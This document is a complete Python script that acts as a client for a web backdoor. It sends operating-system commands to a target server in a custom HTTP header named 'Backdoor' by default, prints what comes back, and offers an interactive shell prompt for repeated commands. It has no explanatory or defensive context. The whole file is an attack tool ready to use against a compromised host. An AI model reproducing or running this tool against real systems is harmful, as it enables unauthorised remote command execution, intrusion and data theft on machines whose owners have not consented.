#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys

def exploit(host, port, command, header="Backdoor"):
    """
    Send a command via a custom header to the target.
    """
    try:
        url = f"http://{host}:{port}/"
        headers = {header: command}
        resp = requests.get(url, headers=headers, timeout=5)
        if resp.status_code == 200:
            print(resp.text.strip())
        else:
            print(f"[!] HTTP {resp.status_code} response")
            print(resp.text.strip())
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")

def interactive_shell(host, port, header="Backdoor"):
    """
    Interactive loop for sending commands.
    """
    print(f"[*] Connected to {host}:{port} (header={header})")
    print("[*] Type 'exit' or Ctrl+C to quit.\n")

    try:
        while True:
            command = input("$ ").strip()
            if not command:
                continue
            if command.lower() in ("exit", "quit"):
                print("[*] Exiting.")
                break
            exploit(host, port, command, header=header)
    except KeyboardInterrupt:
        print("\n[*] Interrupted, exiting.")

def main():
    parser = argparse.ArgumentParser(
        description="Backdoor client to send commands via HTTP header."
    )
    parser.add_argument("host", help="Target host/IP")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument(
        "-H", "--header", default="Backdoor",
        help="Custom header name to use (default: Backdoor)"
    )
    parser.add_argument(
        "--cmd", help="Run a single command (non-interactive mode)"
    )
    args = parser.parse_args()

    if args.cmd:
        exploit(args.host, args.port, args.cmd, header=args.header)
    else:
        interactive_shell(args.host, args.port, header=args.header)

if __name__ == "__main__":
    main()
